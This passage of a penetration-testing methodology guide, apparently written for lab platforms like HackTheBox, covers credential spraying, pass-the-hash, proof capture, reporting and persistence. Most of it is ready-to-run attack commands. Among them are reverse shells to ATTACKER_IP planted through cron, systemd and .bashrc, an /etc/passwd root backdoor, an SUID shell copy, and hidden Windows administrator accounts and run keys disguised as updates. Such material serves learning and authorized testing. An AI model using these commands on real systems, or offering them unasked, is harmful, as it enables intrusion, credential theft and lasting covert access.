    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@TARGET "whoami" 2>/dev/null && echo "[+] Success: $user:$pass"
done

# CrackMapExec for SMB
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt
crackmapexec smb 10.10.10.10 -u admin -p Password123 --shares

# CrackMapExec for WinRM
crackmapexec winrm 10.10.10.0/24 -u users.txt -p passwords.txt
crackmapexec winrm 10.10.10.10 -u admin -p Password123 -x "whoami"

# RDP
hydra -L users.txt -P passwords.txt rdp://10.10.10.10

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u admin -p Password123
```

**üåê Lateral Movement Preparation**

```bash
# Scan for other hosts
nmap -sn 10.10.10.0/24
nmap -sS -p 22,80,443,445,3389,5985 10.10.10.0/24

# Check for SMB shares
crackmapexec smb 10.10.10.0/24 --shares
smbclient -L //10.10.10.10 -U user%password

# Enumerate users on other machines
crackmapexec smb 10.10.10.10 -u user -p password --users
enum4linux -a 10.10.10.10

# Pass-the-Hash
crackmapexec smb 10.10.10.10 -u admin -H <NTLM_HASH>
impacket-psexec -hashes <LM:NT> admin@10.10.10.10
```

---

## 4.7 Proof Collection & Documentation

### 4.7.1 Proof Collection

**üêß Linux Proof Capture**

```bash
# Find proof files
find / -name "proof.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
find / -name "user.txt" 2>/dev/null
find / -name "local.txt" 2>/dev/null

# Common locations
cat /root/proof.txt
cat /root/root.txt
cat /home/user/user.txt
cat /home/user/local.txt

# Capture with context
whoami && id && hostname && cat /root/proof.txt
```

**ü™ü Windows Proof Capture**

```cmd
# Find proof files
dir /s /b C:\proof.txt
dir /s /b C:\*proof*.txt
where /r C:\ proof.txt

# Common locations
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\<user>\Desktop\user.txt
type C:\Users\<user>\Desktop\local.txt

# Capture with context
whoami && hostname && type C:\Users\Administrator\Desktop\proof.txt
```

**üì∏ Screenshot Requirements**

```bash
# Always capture screenshots showing:
# 1. Privilege escalation command execution
# 2. Elevated shell with whoami/id
# 3. System information (hostname, IP, OS version)
# 4. Proof file contents with path

# Example Linux proof screenshot should show:
id
hostname
ip a
uname -a
cat /root/proof.txt

# Example Windows proof screenshot should show:
whoami /all
hostname
ipconfig
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
type C:\Users\Administrator\Desktop\proof.txt
```

### 4.7.2 Documentation Requirements

**üìù Privilege Escalation Report Template**

````markdown
# Privilege Escalation - [Target Name]

## Initial Access
- **Method**: [Web application exploit / Service exploit / etc.]
- **Initial User**: [username]
- **Initial Privileges**: [low-privileged user / service account / etc.]
- **Shell Type**: [bash / cmd / powershell]

## System Information
- **OS**: [Linux Ubuntu 20.04 / Windows Server 2019 / etc.]
- **Kernel**: [5.4.0-42-generic]
- **Architecture**: [x86_64]
- **Hostname**: [hostname]
- **IP Address**: [10.10.10.10]

## Enumeration Findings
### Automated Scans
- **Tools Used**: linpeas.sh, winPEAS.exe
- **Key Findings**:
  - [Finding 1]
  - [Finding 2]

### Manual Enumeration
- **Sudo Rights**: [sudo -l output]
- **SUID Binaries**: [Notable SUID binaries]
- **Services**: [Vulnerable services]
- **Scheduled Tasks/Cron**: [Writable tasks]

## Privilege Escalation Path

### Method: [Sudo Misconfiguration / SUID Binary / Service Exploit / etc.]

**Step 1: Discovery**
```bash
[Command used to discover vulnerability]
[Output]
````

**Step 2: Verification**

```bash
[Command to verify exploitability]
[Output]
```

**Step 3: Exploitation**

```bash
[Exact exploitation commands]
[Output showing success]
```

**Step 4: Proof**

```bash
whoami
id
hostname
cat /root/proof.txt
```

### Credentials Harvested

- **User accounts**:
    - user1:password1 (SSH access to 10.10.10.11)
    - user2:password2 (MySQL access)
- **SSH Keys**:
    - /home/user/.ssh/id_rsa (access to 10.10.10.12)
- **Database Credentials**:
    - MySQL: root:mysqlpass
- **Configuration Files**:
    - /var/www/html/config.php: dbuser:dbpass

### Lateral Movement Opportunities

- **Hosts Identified**: [10.10.10.11, 10.10.10.12]
- **Services Available**: [SSH, RDP, SMB]
- **Credential Reuse**: [Tested credentials on identified hosts]

### Persistence Established

- **Method**: [SSH key added / Scheduled task created]
- **Details**: [Specific commands or configuration]

### Screenshots

- [privesc_discovery.png] - Vulnerability discovery
- [privesc_exploitation.png] - Exploitation in progress
- [privesc_proof.png] - Root/SYSTEM shell with proof

### Recommendations

1. [Remove sudo NOPASSWD for dangerous binaries]
2. [Patch kernel to version X.X.X]
3. [Implement principle of least privilege]
4. [Regular security audits of service permissions]

````

**üìä Command Log**
```bash
# Log all commands during privilege escalation
script -a privesc_commands.log

# When done
exit

# Or save command history
history > privesc_history.txt
````

---

## 4.8 Persistence Mechanisms

**‚ö†Ô∏è Note:**¬†Only establish persistence if explicitly authorized in the scope.

### 4.8.1 Linux Persistence

**üîë SSH Key Persistence**

```bash
# Generate key pair on attacker
ssh-keygen -f persist_key

# Add public key to target
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> /home/user/.ssh/authorized_keys

# Ensure proper permissions
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Set immutable flag (prevents deletion)
chattr +i /root/.ssh/authorized_keys
# To remove: chattr -i /root/.ssh/authorized_keys
```

**‚è∞ Cron Job Persistence**

```bash
# Add reverse shell to crontab
(crontab -l; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -

# System-wide cron
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /etc/crontab

# Cron script
cat > /etc/cron.daily/update << EOF
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /etc/cron.daily/update
```

**üîß Service Persistence**

```bash
# Create systemd service
cat > /etc/systemd/system/persist.service << EOF
[Unit]
Description=Persistence Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable persist.service
systemctl start persist.service
```

**üêö Shell Persistence**

```bash
# Add to .bashrc
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &" >> /root/.bashrc

# SUID shell
cp /bin/bash /tmp/.hidden
chmod +s /tmp/.hidden
# Use with: /tmp/.hidden -p
```

**üìù /etc/passwd Backdoor**

```bash
# Create backdoor user
openssl passwd -1 -salt salt password123
echo 'backdoor:$1$salt$qVR7HRO59TLcCKGLXyXQZ.:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### 4.8.2 Windows Persistence

**üìÖ Scheduled Task Persistence**

```cmd
# Create scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\System32\reverse_shell.exe" /sc onlogon /ru System
schtasks /create /tn "Update" /tr "powershell -enc <BASE64>" /sc minute /mo 5

# Alternative with XML
schtasks /create /tn "Updater" /xml task.xml
```

**üîë Registry Run Key Persistence**

```cmd
# Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Temp\shell.exe" /f

# Local machine (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Temp\shell.exe" /f

# RunOnce
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\Temp\shell.exe" /f
```

**‚öôÔ∏è Service Persistence**

```cmd
# Create new service
sc create "WindowsUpdate" binPath= "C:\Windows\System32\reverse_shell.exe" start= auto
sc start "WindowsUpdate"

# Modify existing service
sc config <ServiceName> binPath= "C:\Temp\shell.exe" start= auto
```

**ü™ü Startup Folder Persistence**

```cmd
# Current user
copy C:\Temp\shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# All users (requires admin)
copy C:\Temp\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

**üë§ User Account Persistence**

```cmd
# Create backdoor user
net user backdoor Password123! /add
net localgroup Administrators backdoor /add

# Hide user (won't show on login screen)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0 /f
```

**üîê RDP Persistence**

```cmd
# Enable RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Allow through firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Create RDP user
net user rdpuser Password123! /add
net localgroup "Remote Desktop Users" rdpuser /add
```

---

## 4.9 Quick Reference Commands

### Linux Quick Wins

```bash
# One-liner enumeration
whoami; id; hostname; uname -a; ip a; sudo -l

# Quick SUID search
find / -perm -4000 2>/dev/null | grep -v snap

# Quick capability check
getcap -r / 2>/dev/null

# Quick writable files
find / -writable -type f 2>/dev/null | grep -v proc | head -20

# Quick credential search
grep -r "password" /var/www /home 2>/dev/null | grep -v Binary | head -10
```

### Windows Quick Wins

```cmd
# One-liner enumeration
whoami /all & hostname & systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Quick privilege check
whoami /priv | findstr "SeImpersonate\|SeAssignPrimaryToken\|SeBackup\|SeRestore"

# Quick service check
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Quick scheduled task check
schtasks /query /fo LIST /v | findstr /i "exe\|bat\|ps1"

# Quick credential search
findstr /si password C:\*.txt C:\*.xml C:\*.ini C:\*.config 2>nul
```

---

## üéØ Success Metrics

A successful privilege escalation phase achieves:

- ‚úÖ¬†**Root/SYSTEM/Administrator access**¬†confirmed
- ‚úÖ¬†**Proof file captured**¬†with full context (whoami, hostname, etc.)
- ‚úÖ¬†**Complete documentation**¬†of escalation path
- ‚úÖ¬†**Screenshots**¬†of all critical steps
- ‚úÖ¬†**Credentials harvested**¬†and organized
- ‚úÖ¬†**Lateral movement targets**¬†identified
- ‚úÖ¬†**Persistence established**¬†(if authorized)
- ‚úÖ¬†**Reproducible exploitation steps**¬†documented

---

## üìö Additional Resources

**Essential References:**

- [GTFOBins](https://gtfobins.github.io/)¬†- Unix binaries exploitation
- [LOLBAS](https://lolbas-project.github.io/)¬†- Windows binaries
- [HackTricks](https://book.hacktricks.xyz/)¬†- Comprehensive pentesting guide
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)¬†- Exploitation payloads
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)¬†- Privilege escalation scripts
- [Windows Privilege Escalation Guide](https://www.fuzzysecurity.com/tutorials/16.html)

**Practice Platforms:**

- HackTheBox - Retired machines for practice
- VulnHub - Free vulnerable VMs
- TryHackMe - Guided privilege escalation rooms
